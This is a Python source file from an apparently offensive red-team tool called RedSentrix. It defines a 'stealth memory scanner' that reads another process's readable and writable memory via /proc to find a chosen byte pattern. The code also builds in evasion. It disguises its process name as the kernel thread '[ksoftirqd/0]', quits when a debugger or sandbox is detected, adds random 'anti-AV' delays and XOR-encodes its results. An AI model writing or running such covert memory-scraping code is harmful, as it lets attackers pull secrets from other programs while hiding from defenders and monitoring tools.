import os
import psutil
import base64
import time
import random
import sys
import argparse
import ctypes

from redsentrix_core.stealth_utils import StealthUtils, xor_encode, base64_encode, entropy_check, throttle_activity
from redsentrix_core.logger import Logger

logger = Logger()

class StealthMemoryScanner:
    def __init__(self, pattern, process_name=None, pid=None, encoding=None, key=None, entropy_mode=False):
        self.pattern = pattern
        self.process_name = process_name
        self.pid = pid
        self.encoding = encoding
        self.key = key.encode() if key else None
        self.entropy_mode = entropy_mode

    def find_process_pid(self, name):
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == name:
                return proc.info['pid']
        return None

    def decode_pattern(self):
        try:
            raw_pattern = self.pattern.encode()
            if self.encoding == "xor":
                if not self.key:
                    raise ValueError("XOR encoding requires a key.")
                return xor_encode(raw_pattern, self.key)
            elif self.encoding == "base64":
                return base64.b64decode(self.pattern)
            return raw_pattern
        except Exception as e:
            logger.log(f"Pattern decoding failed: {str(e)}", level="error")
            sys.exit(1)

    def scan_proc_mem(self, pid, pattern_bytes):
        mem_path = f"/proc/{pid}/mem"
        maps_path = f"/proc/{pid}/maps"

        try:
            with open(maps_path, 'r') as maps_file, open(mem_path, 'rb', 0) as mem_file:
                for line in maps_file:
                    parts = line.split(' ')
                    address_range = parts[0]
                    perms = parts[1]

                    if 'r' not in perms or 'w' not in perms:
                        continue

                    start, end = [int(x, 16) for x in address_range.split('-')]

                    try:
                        mem_file.seek(start)
                        chunk = mem_file.read(end - start)

                        if self.entropy_mode:
                            ent = entropy_check(chunk)
                            if ent > 7.0:
                                logger.log(f"High-entropy memory at 0x{start:x} (entropy={ent:.2f})", level="debug")

                        offset = chunk.find(pattern_bytes)
                        if offset != -1:
                            found_at = start + offset
                            encoded_result = xor_encode(chunk[offset:offset + len(pattern_bytes)], b'RS')  # Encode result
                            logger.log(f"Pattern found at 0x{found_at:x} -> Encoded: {encoded_result}", level="info")

                        time.sleep(random.uniform(0.05, 0.15))  # anti-AV timing
                    except Exception:
                        continue
        except Exception as e:
            logger.log(f"Failed reading memory: {e}", level="error")

    def spoof_name(self):
        try:
            libc = ctypes.cdll.LoadLibrary("libc.so.6")
            libc.prctl(15, b"[ksoftirqd/0]", 0, 0, 0)  # PR_SET_NAME to spoof name
        except Exception:
            pass

    def run(self):
        self.spoof_name()

        logger.log(f"Starting stealth memory scan for pattern '{self.pattern}'...")

        if StealthUtils.is_debugger_present():
            logger.log("Debugger detected. Exiting for stealth.", level="warn")
            sys.exit(1)

        if StealthUtils.sandbox_check():
            logger.log("Sandbox environment detected. Exiting for stealth.", level="warn")
            sys.exit(1)

        throttle_activity()

        pid = self.pid or self.find_process_pid(self.process_name)
        if not pid:
            logger.log("Target process not found.", level="error")
            return

        pattern_bytes = self.decode_pattern()
        self.scan_proc_mem(pid, pattern_bytes)


# CLI entrypoint for RedSentrix
def main(args):
    scanner = StealthMemoryScanner(
        pattern=args.pattern,
        process_name=args.process,
        pid=args.pid,
        encoding=args.covert,
        key=args.key,
        entropy_mode=args.entropy
    )
    scanner.run()

